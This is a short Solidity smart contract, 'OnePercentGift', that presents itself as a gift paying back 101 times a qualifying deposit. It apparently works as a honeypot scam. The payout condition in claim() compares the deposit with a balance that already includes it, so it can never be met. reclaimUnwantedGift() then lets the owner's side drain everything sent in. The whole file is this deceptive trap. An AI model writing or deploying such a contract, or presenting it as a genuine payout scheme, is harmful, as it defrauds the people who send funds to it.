1 pragma solidity ^0.4.21;
2 
3 contract OnePercentGift{
4 	
5 	address owner;
6 
7 	function OnePercentGift(){
8 		owner=msg.sender;
9 	}
10 
11 	function refillGift() payable public{
12 
13 	}
14 
15 	function claim() payable public{
16 		if(msg.value == address(this).balance * 100){
17 			msg.sender.transfer(msg.value * 101);
18 		}
19 	}
20 
21 	function reclaimUnwantedGift() public{
22 		owner.transfer(address(this).balance);
23 	}
24 }